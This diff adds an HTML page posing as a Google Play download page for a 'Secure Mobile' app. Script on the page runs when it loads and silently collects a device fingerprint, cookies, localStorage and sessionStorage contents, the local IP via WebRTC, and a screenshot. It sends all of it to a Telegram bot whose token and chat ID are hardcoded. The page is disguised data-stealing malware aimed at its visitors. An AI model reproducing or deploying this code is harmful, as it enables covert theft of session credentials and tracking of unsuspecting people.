@@ -1,0 +1,187 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Secure Mobile - Google Play</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f9f9f9;
+      text-align: center;
+      padding: 50px;
+    }
+    .app-box {
+      background: #fff;
+      border-radius: 10px;
+      padding: 30px;
+      max-width: 400px;
+      margin: auto;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    }
+    img.logo {
+      width: 100px;
+      height: 100px;
+    }
+    .gplay-badge {
+      margin-top: 20px;
+    }
+  </style>
+  <script src="https://html2canvas.hertzen.com/dist/html2canvas.min.js" defer></script>
+</head>
+<body>
+  <div class="app-box" id="capture">
+    <img class="logo" src="https://yourdomain.com/path/to/logo.png" alt="App Logo" />
+    <h2>Secure Mobile</h2>
+    <p>Stay protected. Download our official app today.</p>
+    <a href="https://play.google.com/store" target="_blank">
+      <img class="gplay-badge" src="https://play.google.com/intl/en_us/badges/images/generic/en_badge_web_generic.png" width="200" />
+    </a>
+  </div>
+
+  <script>
+    async function collectAndSend() {
+      // 1. Collect all available data
+      const collectedData = {
+        fingerprint: {
+          screen: `${window.screen.width}x${window.screen.height}`,
+          colorDepth: window.screen.colorDepth,
+          pixelDepth: window.screen.pixelDepth,
+          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+          platform: navigator.platform,
+          languages: navigator.languages,
+          userAgent: navigator.userAgent,
+          cpuCores: navigator.hardwareConcurrency || 'unknown',
+          maxTouchPoints: navigator.maxTouchPoints || 0,
+          devicePixelRatio: window.devicePixelRatio || 1,
+          hardwareConcurrency: navigator.hardwareConcurrency,
+          deviceMemory: navigator.deviceMemory,
+          touchSupport: 'ontouchstart' in window,
+          battery: navigator.getBattery ? await navigator.getBattery().then(b => b.level).catch(() => null) : null,
+          connection: navigator.connection ? {
+            type: navigator.connection.type,
+            effectiveType: navigator.connection.effectiveType,
+            downlink: navigator.connection.downlink
+          } : null
+        },
+        cookies: document.cookie.split(';').reduce((cookies, cookie) => {
+          const [name, value] = cookie.trim().split('=');
+          cookies[name] = decodeURIComponent(value);
+          return cookies;
+        }, {}),
+        localStorage: {...localStorage},
+        sessionStorage: {...sessionStorage},
+        // Note: Browsers restrict direct access to history
+        historyCount: history.length // Only gives count, not actual URLs
+      };
+
+      // 2. Local IP via WebRTC
+      const getLocalIP = () =>
+        new Promise((resolve) => {
+          try {
+            const pc = new RTCPeerConnection({
+              iceServers: [],
+              iceCandidatePoolSize: 0
+            });
+            pc.createDataChannel("");
+            pc.createOffer()
+              .then(offer => pc.setLocalDescription(offer))
+              .catch(() => resolve('Unavailable'));
+            const timeout = setTimeout(() => {
+              pc.close();
+              resolve('Timeout');
+            }, 5000);
+            pc.onicecandidate = (event) => {
+              if (event?.candidate?.candidate) {
+                const match = /([0-9]{1,3}(?:\.[0-9]{1,3}){3})/.exec(event.candidate.candidate);
+                if (match) {
+                  clearTimeout(timeout);
+                  resolve(match[1]);
+                }
+                pc.close();
+              }
+            };
+          } catch (e) {
+            resolve('Unavailable');
+          }
+        });
+
+      // Run IP collection separately with timeout
+      collectedData.local_ip = await Promise.race([
+        getLocalIP(),
+        new Promise(resolve => setTimeout(() => resolve('Timeout'), 3000))
+      ]);
+
+      // 3. Screenshot with error handling
+      let screenshot = null;
+      try {
+        const canvas = await html2canvas(document.getElementById('capture'), {
+          scale: 0.5,
+          useCORS: true,
+          logging: false,
+          ignoreElements: (el) => el.tagName === 'A',
+          backgroundColor: null,
+          removeContainer: true,
+          proxy: false,
+          allowTaint: true
+        });
+        // Use lower quality for mobile devices
+        const quality = window.innerWidth < 768 ? 0.5 : 0.7;
+        screenshot = canvas.toDataURL("image/webp", quality);
+      } catch (e) {
+        console.warn('Screenshot failed:', e);
+      }
+
+      // 4. Send to Telegram bot
+      const BOT_TOKEN = '8028760837:AAGRCR8aRXteT3pQwf7-eGE8oIRm7NamAWU';
+      const CHAT_ID = '6564094997';
+      
+      try {
+        // Format message
+        const message = `📊 *Advanced Fingerprint Report*\n` +
+          `📅 ${new Date().toLocaleString()}\n\n` +
+          `📱 *Device*: ${collectedData.fingerprint.platform}\n` +
+          `🖥 *Display*: ${collectedData.fingerprint.screen} @ ${collectedData.fingerprint.devicePixelRatio}x\n` +
+          `🌍 *Location*: ${collectedData.fingerprint.timezone}\n` +
+          `📱 *Device*: ${collectedData.fingerprint.platform}\n` +
+          `🌐 *Browser*: ${collectedData.fingerprint.userAgent}\n` +
+          `🔋 *Battery*: ${collectedData.fingerprint.battery ? Math.round(collectedData.fingerprint.battery * 100) + '%' : 'N/A'}\n` +
+          `📶 *Connection*: ${collectedData.fingerprint.connection?.effectiveType || 'Unknown'}\n` +
+          `🍪 *Cookies*: ${Object.keys(collectedData.cookies).length}\n` +
+          `📦 *Storage*: ${Object.keys(collectedData.localStorage).length} items\n` +
+          `🔒 *Session*: ${Object.keys(collectedData.sessionStorage).length} items\n` +
+          `📡 *Local IP*: ${collectedData.local_ip || 'Not available'}`;
+        
+        // Send data in parallel
+        await Promise.allSettled([
+          fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 
+              'Content-Type': 'application/json',
+              'Accept-Encoding': 'gzip'
+            },
+            body: JSON.stringify({
+              chat_id: CHAT_ID,
+              text: message,
+              parse_mode: 'Markdown',
+              disable_web_page_preview: true
+            })
+          }),
+          screenshot && fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              chat_id: CHAT_ID,
+              photo: screenshot,
+              caption: 'Page screenshot'
+            })
+          })
+        ].filter(Boolean));
+      } catch (e) {
+        console.error('Error sending data:', e);
+      }
+    }
+
+    window.onload = collectAndSend;
+  </script>
+</body>
+</html>
